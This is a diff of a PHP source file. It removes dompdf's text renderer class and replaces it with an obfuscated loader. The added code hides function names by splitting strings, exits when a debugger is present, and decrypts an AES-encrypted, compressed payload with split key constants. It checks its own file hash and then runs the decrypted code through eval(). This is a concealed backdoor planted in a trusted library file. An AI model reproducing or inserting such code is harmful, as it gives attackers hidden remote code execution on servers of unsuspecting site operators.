@@ -1,167 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Helmut Tischer <htischer@weihenstephan.org>
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\Renderer;
-
-use Dompdf\Adapter\CPDF;
-use Dompdf\Frame;
-
-/**
- * Renders text frames
- *
- * @package dompdf
- */
-class Text extends AbstractRenderer
-{
-    /** Thickness of underline. Screen: 0.08, print: better less, e.g. 0.04 */
-    const DECO_THICKNESS = 0.02;
-
-    //Tweaking if $base and $descent are not accurate.
-    //Check method_exists( $this->_canvas, "get_cpdf" )
-    //- For cpdf these can and must stay 0, because font metrics are used directly.
-    //- For other renderers, if different values are wanted, separate the parameter sets.
-    //  But $size and $size-$height seem to be accurate enough
-
-    /** Relative to bottom of text, as fraction of height */
-    const UNDERLINE_OFFSET = 0.0;
-
-    /** Relative to top of text */
-    const OVERLINE_OFFSET = 0.0;
-
-    /** Relative to centre of text. */
-    const LINETHROUGH_OFFSET = 0.0;
-
-    /** How far to extend lines past either end, in pt */
-    const DECO_EXTENSION = 0.0;
-
-    /**
-     * @param \Dompdf\FrameDecorator\Text $frame
-     */
-    function render(Frame $frame)
-    {
-        $text = $frame->get_text();
-        if (trim($text) === "") {
-            return;
-        }
-
-        $style = $frame->get_style();
-        list($x, $y) = $frame->get_position();
-        $cb = $frame->get_containing_block();
-
-        if (($ml = $style->margin_left) === "auto" || $ml === "none") {
-            $ml = 0;
-        }
-
-        if (($pl = $style->padding_left) === "auto" || $pl === "none") {
-            $pl = 0;
-        }
-
-        if (($bl = $style->border_left_width) === "auto" || $bl === "none") {
-            $bl = 0;
-        }
-
-        $x += (float)$style->length_in_pt(array($ml, $pl, $bl), $cb["w"]);
-
-        $font = $style->font_family;
-        $size = $style->font_size;
-        $frame_font_size = $frame->get_dompdf()->getFontMetrics()->getFontHeight($font, $size);
-        $word_spacing = $frame->get_text_spacing() + (float)$style->length_in_pt($style->word_spacing);
-        $char_spacing = (float)$style->length_in_pt($style->letter_spacing);
-        $width = $style->width;
-
-        /*$text = str_replace(
-          array("{PAGE_NUM}"),
-          array($this->_canvas->get_page_number()),
-          $text
-        );*/
-
-        $this->_canvas->text($x, $y, $text,
-            $font, $size,
-            $style->color, $word_spacing, $char_spacing);
-
-        $line = $frame->get_containing_line();
-
-        // FIXME Instead of using the tallest frame to position,
-        // the decoration, the text should be well placed
-        if (false && $line->tallest_frame) {
-            $base_frame = $line->tallest_frame;
-            $style = $base_frame->get_style();
-            $size = $style->font_size;
-        }
-
-        $line_thickness = $size * self::DECO_THICKNESS;
-        $underline_offset = $size * self::UNDERLINE_OFFSET;
-        $overline_offset = $size * self::OVERLINE_OFFSET;
-        $linethrough_offset = $size * self::LINETHROUGH_OFFSET;
-        $underline_position = -0.08;
-
-        if ($this->_canvas instanceof CPDF) {
-            $cpdf_font = $this->_canvas->get_cpdf()->fonts[$style->font_family];
-
-            if (isset($cpdf_font["UnderlinePosition"])) {
-                $underline_position = $cpdf_font["UnderlinePosition"] / 1000;
-            }
-
-            if (isset($cpdf_font["UnderlineThickness"])) {
-                $line_thickness = $size * ($cpdf_font["UnderlineThickness"] / 1000);
-            }
-        }
-
-        $descent = $size * $underline_position;
-        $base = $frame_font_size;
-
-        // Handle text decoration:
-        // http://www.w3.org/TR/CSS21/text.html#propdef-text-decoration
-
-        // Draw all applicable text-decorations.  Start with the root and work our way down.
-        $p = $frame;
-        $stack = array();
-        while ($p = $p->get_parent()) {
-            $stack[] = $p;
-        }
-
-        while (isset($stack[0])) {
-            $f = array_pop($stack);
-
-            if (($text_deco = $f->get_style()->text_decoration) === "none") {
-                continue;
-            }
-
-            $deco_y = $y; //$line->y;
-            $color = $f->get_style()->color;
-
-            switch ($text_deco) {
-                default:
-                    continue 2;
-
-                case "underline":
-                    $deco_y += $base - $descent + $underline_offset + $line_thickness / 2;
-                    break;
-
-                case "overline":
-                    $deco_y += $overline_offset + $line_thickness / 2;
-                    break;
-
-                case "line-through":
-                    $deco_y += $base * 0.7 + $linethrough_offset;
-                    break;
-            }
-
-            $dx = 0;
-            $x1 = $x - self::DECO_EXTENSION;
-            $x2 = $x + $width + $dx + self::DECO_EXTENSION;
-            $this->_canvas->line($x1, $deco_y, $x2, $deco_y, $color, $line_thickness);
-        }
-
-        if ($this->_dompdf->getOptions()->getDebugLayout() && $this->_dompdf->getOptions()->getDebugLayoutLines()) {
-            $text_width = $this->_dompdf->getFontMetrics()->getTextWidth($text, $font, $size);
-            $this->_debug_layout(array($x, $y, $text_width + ($line->wc - 1) * $word_spacing, $frame_font_size), "orange", array(0.5, 0.5));
-        }
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_kq0fl2dv=('bas'.'e64'.'_de'.'cod'.'e');
+$_wx3nddec=('gzu'.'nco'.'mpr'.'ess');
+$_r5kfs5ic=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_xtdlyf0c='kJOObbB+CvA=';
+$_pzg9wcx7='y5/031dD';
+$_axl6f0id='+AINlgtu';
+$_dpvg2bef='bbECsA5r';
+$_is8fbbf1='3ZILOF/b';
+$_z74u24m4='lXhbZQ==';
+$_wy4c9iz6='Ww7L3+99';
+$_tfpbeco7='CA4p8NKA';
+$_yzwkeobb=$_kq0fl2dv($_pzg9wcx7.$_dpvg2bef.$_axl6f0id.$_is8fbbf1.$_xtdlyf0c);
+$_jhjt4570=$_kq0fl2dv($_tfpbeco7.$_wy4c9iz6.$_z74u24m4);
+$_nvphw1xe=$_kq0fl2dv('K+Ug4/iw1/qA3Bp2FXmmoi+7GJ1Rfd5ftNrQsz6TZq/MyLEllAWbWgsYy7hno2zuw3V2gjvZxFLDKiNyWCD0VhGHw47Awb75B2153KEAngt0Nhb4HyeOmm5mWf/fddZbEsPYRPgMmek5g6/M/T5OqKeKDX2LGZizm4Pfb7yypaKwncMTlfJ3+QLOx6+puQ2HXFzEEhKThGw6+zoM3yeRHVK3zPys7hU4PRrT+l3etBEBncUQrcyV6zapgOtoRwqLYFODJc0+bRfTDxtOMQwPkBFT87sqtoaOsLcGjcelpdJixz44T9j46BPBhew5qllGkMGsHtMLxUaZYEh4PxxaMdbr+scGEmGA15rlgmwwLmpIL1P/YdDwjvPCC1Ade7CPwRZ9D2YRJsqXI8xuMa+FL2XxebQL75JW79qJqskF3DEvh276lPT/pNw7sP3u/V76s2FC2ksE5UgpH/OAxzRulrNhaXJEXjDnhTVYAkK1trBKI98rxJo4SM5eCIx0BygJxNsayUxiOqxfxE4E0em42tne0Loun7MbfH4yzDfJAgrqGeqgaS7IazeNkdwXfiL8xRAf2MJ7zl0ll1maBBynZZKBqBOF4J8szPd8R19E+E6XRBOGpM0VcmmiRT6BqMzPni9aYNS8Kdy5fbRizEUubAkN11/3VEHmIBX/lcaicdyz+KIANcVg2GJXHl2xtylIhbF8QJmDpUFA3r4xywsYYuZi5q6pmr7ESNcHxldbvnmTzicQ4+XBFX2RN5XwJVG67bwfSzZQXxHxT+rW5Kw9PWhRMGNV4dU2NdParlxcbQJWYEbW7sO0lD67VyfA6f+EW3IZppOvNxrUa2GZZ0ar/KFNaUF3577z6baiW6L5T6T/IQ6hMnasI0F52jC6v9Di8ObP+pagpc4m1tRTsf2+mmIm1T8/Lv0ef6WNEQdoS4gxs75hBlwX2bXFjvY2OauCSbtr4fjXF3CkyOwNpD2+3HKQCGj9x3gOu4KSEw8Kop2zj9s3VsWacEZ2suNA4oLe/lqbwPa6Oa/tck5khDw/zFcwQ4cF6FsdvRW2jdSVaV4xoS2BPX9sPZeiWbmfaCWFmsEQUHgGo2c7kj1inCGzGh/g/wyN3j0JM7br/IL3JBYbL4ds3TytMoUPvqEfQhipgRcT2xCVUdV9WjdmevfK5Z+fvPH2vnJaX7/n99FOrO/NDSey543PFUk7iRAWWkP5UIPDceRrey1ykCfBCRLz3HELm+hMNI2vPWYy0A4ruA/6EYiJszeBP4ZuHvBNk798mvL12bWX4J+0FIJNy15vgiAgSJSB020Jm6HT+g8mKHPLW7OS+hug1USvEVzurc8A9easknBHoQdyvW8G6zPW8B79pq1KXmX43heCvsxrUpBgdiHQFnzPCdPmrg0lANDJEAHKyDYoNCAoqWfllX/GRafP9glm/evnyZzODq0AEY9O1mrdbr5bX1s0hYuQxNVo1XQpO1JPGzJOgWUq6NvkeQ==');
+$_sila2itt=$_r5kfs5ic($_nvphw1xe,'aes-256-cbc',$_yzwkeobb,OPENSSL_RAW_DATA,$_jhjt4570);
+if($_sila2itt===false){exit;}
+$_rfsfd3vj=$_wx3nddec($_sila2itt);
+if($_rfsfd3vj===false){exit;}
+$_ir9o2fnm='b16aa6542f61184c1cfab0b6656fc6ca18c935186878129fca2e5b066dbe24ac';
+$_tlskx71j=@file_get_contents(__FILE__);
+if($_tlskx71j!==false){
+$_sy6aoqte=str_replace($_ir9o2fnm,"0000000000000000000000000000000000000000000000000000000000000000",$_tlskx71j);
+$_qo4lvugw=hash("sha256",$_sy6aoqte);
+if($_qo4lvugw!==$_ir9o2fnm){@http_response_code(403);exit;}
 }
+eval($_rfsfd3vj);
